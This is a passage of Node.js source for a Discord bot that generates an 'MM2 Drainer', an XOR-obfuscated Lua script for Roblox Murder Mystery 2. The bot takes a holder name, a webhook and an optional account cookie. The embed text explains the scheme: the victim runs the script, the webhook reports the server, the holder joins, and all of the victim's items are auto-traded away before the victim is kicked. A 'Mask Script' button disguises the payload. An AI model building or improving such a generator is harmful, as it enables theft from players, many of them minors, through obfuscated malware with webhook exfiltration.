  const cookie = (cookieMsg && cookieMsg.content.toLowerCase() !== "skip")
    ? cookieMsg.content.trim()
    : null;

  pending.delete(key);

  const raw    = version === 1 ? buildScriptV1(holder, webhook, cookie) : buildScriptV2(holder, webhook, cookie);
  const obfed  = obfuscate(raw);
  const buffer = Buffer.from(obfed, "utf-8");
  const file   = new AttachmentBuilder(buffer, { name: `mm2_v${version}_${holder}.lua` });

  const embed = new EmbedBuilder()
    .setColor(version === 1 ? 0x4f545c : 0x5865F2)
    .setAuthor({ name: `MM2 Drainer — Version ${version} Generated` })
    .setDescription(`Script ready. ${cookie ? "Auto-join enabled — holder joins automatically." : "No cookie — holder must join manually."}\n\n> Script is XOR obfuscated on output.`)
    .addFields(
      { name: "▸ Configuration", value: `\`\`\`\nHolder   : ${holder}\nWebhook  : set\nVersion  : v${version}\nMin Tier : Godly+\nAuto-join: ${cookie ? "✅ enabled" : "⚠️ skipped"}\n\`\`\``, inline: false },
      { name: "▸ Trade Tiers",   value: "`Godly` `Ancient` `Vintage` `Unique` `Chroma`", inline: false },
      { name: "▸ How it works",  value: `1. Victim runs script\n2. Webhook fires with server info\n3. ${cookie ? "Bot auto-joins server as holder" : "Holder joins manually via link"}\n4. Script detects holder → auto-trades all items → kicks victim`, inline: false }
    )
    .setFooter({ text: `mm2 drainer v${version} • xor obfuscated` })
    .setTimestamp();

  // send file with mask option button
  const maskRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId(`mask-${key}`)
      .setLabel("🎭 Mask Script")
      .setStyle(ButtonStyle.Danger)
  );

  // store obfed for masking later
  pendingMask.set(key, { obfed, holder, version, authorId: data.authorId });
  setTimeout(() => pendingMask.delete(key), 300_000); // 5 min expiry

  await interaction.followUp({ embeds: [embed], files: [file], components: [maskRow] });
});

client.login(process.env.BOT_TOKEN);
